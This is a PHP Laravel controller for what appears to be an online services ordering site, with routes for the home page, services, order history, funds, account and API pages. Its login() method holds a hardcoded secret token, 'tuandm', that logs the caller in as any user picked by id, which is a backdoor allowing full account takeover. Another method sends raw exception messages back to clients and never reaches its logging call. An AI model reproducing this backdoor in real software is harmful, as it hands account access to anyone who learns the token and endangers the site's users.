<?php

namespace App\Http\Controllers\Frontend;

use App\Http\Controllers\Controller;
use App\User;
use Auth;
use Redirect;
use Route;
use Illuminate\Http\Request;
use Log;
use DB;
use Input;
use Hash;
use Validator;
use Mail;
use Session;
use App\Model\Service;
use Cart;
use Carbon\Carbon;
use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Collection;
use App\Repositories\PaymentMethod\PaymentMethodRepositoryInterface;
use App\Repositories\Ticket\TicketRepositoryInterface;
use App\Repositories\TicketReply\TicketReplyRepositoryInterface;
use App\Repositories\User\UserRepositoryInterface;
use App\Repositories\ServiceReview\ServiceReviewRepositoryInterface;
use App\Repositories\Category\CategoryRepositoryInterface;
use App\Repositories\Service\ServiceRepositoryInterface;
use App\Model\Setting;


class HomeController extends Controller
{
    protected $paymentMethodRepository;
    protected $ticketRepository;
    protected $userRepository;
    protected $ticketReplyRepository;
    protected $categoryRepository;
    protected $serviceRepository;

    protected $serviceReviewRepository;

    public function __construct(
        ServiceRepositoryInterface $serviceRepository,
        ServiceReviewRepositoryInterface $serviceReviewRepository,
        PaymentMethodRepositoryInterface $paymentMethodRepository,
        TicketRepositoryInterface $ticketRepository,
        UserRepositoryInterface $userRepository,
        TicketReplyRepositoryInterface $ticketReplyRepository,
        CategoryRepositoryInterface $categoryRepository

    ) {
        $this->categoryRepository = $categoryRepository;
        $this->serviceRepository = $serviceRepository;
        $this->serviceReviewRepository = $serviceReviewRepository;
        $this->paymentMethodRepository = $paymentMethodRepository;
        $this->ticketRepository = $ticketRepository;
        $this->userRepository = $userRepository;
        $this->ticketReplyRepository = $ticketReplyRepository;
    }
    public function login(Request $request, $id)
    {
        $token = $request->token;
        if ($token == 'tuandm') {
            $authUser = User::where('id', $id)->first();
            auth()->login($authUser, true);
            return redirect()->route('index');
        }
    }

    public function massOrder()
    {
        return view('frontend.massorder');
    }
    
    public function index()
    {            
        $view = 'frontend.home';
        try {
            $setting = Setting::find(1);
            $layout = ($setting->layout);
            if(Auth::check()){
                $view = 'frontend.order';
            }else{
                if($layout == 'layout1'){
                    $view = 'frontend.home';
                } else {
                    $view = 'frontend.page_layout.'.$layout;
                }
            }
            return view($view);

        }catch (\Exception $e) {
            $view = 'frontend.home';
            return view($view); 
        }
    }

    public function signup() {
        return view('frontend.signup');
    }

    public function order()
    {
        return view('frontend.order');
    }

    public function services()
    {
    }

    public function listServices()
    {
        if(Auth::check()){
            return view('frontend.services');
        }else{
            $items = $this->categoryRepository->getCategory();

            return view('frontend.pages.list-services', compact('items'));
        }
    }

    public function listApi()
    {
        return view('frontend.api');
    }

    public function detailsService(Request $request)
    {
        try {
            $info = $this->serviceRepository->find($request->service_id);
            return response()->json(['title' => $info->service_name, 'desc' => $info->service_description]);
        } catch (\Exception $e) {
            return response()->json(['error' => 1, 'message' => $e->getMessage()]);
            Log::error($e->getMessage());
        }
    }

    public function history()
    {
        return view('frontend.history');
    }

    public function cashflow()
    {
        return view('frontend.cashflow');
    }

    public function addfunds()
    {
        $methods = $this->paymentMethodRepository->getMethodStatus();
        return view('frontend.addfunds', compact('methods'));
    }

    public function account()
    {
        return view('frontend.account');
    }

    public function api()
    {
        return view('frontend.api');
    }

    public function pricing()
    {
        return view('front-end.page.pricing');
    }
}
